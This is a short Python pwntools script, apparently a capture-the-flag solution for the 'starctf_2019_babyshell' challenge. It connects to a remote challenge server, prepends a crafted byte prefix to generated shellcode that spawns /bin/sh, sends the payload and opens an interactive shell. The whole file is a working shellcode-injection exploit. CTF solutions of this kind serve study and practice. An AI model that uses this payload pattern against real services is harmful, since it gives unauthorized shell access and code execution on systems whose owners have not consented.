from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'


# io = process('./starctf_2019_babyshell')
io = remote('node4.buuoj.cn',25442)
# elf = ELF('./starctf_2019_babyshell')

print(disasm(b'\x00B3'))
print(disasm(b'\x00J\x00'))
payload = b'\x00B3' + asm(shellcraft.sh())
io.send(payload)
io.interactive()